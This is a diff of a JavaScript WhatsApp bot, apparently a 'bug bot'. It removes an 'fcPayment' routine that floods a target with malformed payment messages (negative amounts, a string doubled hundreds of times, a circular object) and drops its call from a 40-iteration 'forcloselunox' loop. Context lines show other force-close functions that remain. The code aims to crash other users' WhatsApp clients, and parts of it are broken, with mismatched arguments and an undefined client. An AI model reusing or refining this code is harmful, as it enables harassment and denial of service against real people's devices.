@@ -221,47 +221,6 @@ if (global.owneroff && !isCmd) {
 const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}
 
 //FUNCTION BUG
-async function fcPayment(sock, target) {
-  let x = 'OrtuluhMatik ꦾ𑇂𑆵𑆴𑆿';
-  for (let i = 0; i < 350; i++) x += x;
-  
-  await client.relayMessage(target, {
-    sendPaymentRequest: {}
-  }, {});
-  
-  await client.relayMessage(target, {
-    paymentResponseMessage: {
-      amount1000: -1,
-      currency: 'x',
-      transactionId: x,
-      status: 999
-    }
-  }, {});
-  
-  await client.relayMessage(target, {
-    requestPaymentMessage: {
-      currency: 'x',
-      amount1000: 999999,
-      requestFrom: target,
-      noteMessage: { conversation: x }
-    }
-  }, {});
-  
-  await client.relayMessage(target, {
-    paymentInviteMessage: {
-      serviceType: 99,
-      expiryTimestamp: 999999
-    }
-  }, {});
-  
-  let maklu = {};
-  maklu.a = maklu;
-  
-  await client.relayMessage(target, {
-    sendPaymentMessage: { noteMessage: maklu }
-  }, {});
-}
-
 async function ForceInvisions(target) {
   const stikerMessage = {
    groupStatusMessageV2: {
@@ -899,7 +858,6 @@ async function forcloselunox(target) {
   for (let i = 0; i < 40; i++) {
     await ForceInvisions(target);
     await sleep(600);
-    await fcPayment(target);
   }
 }
 
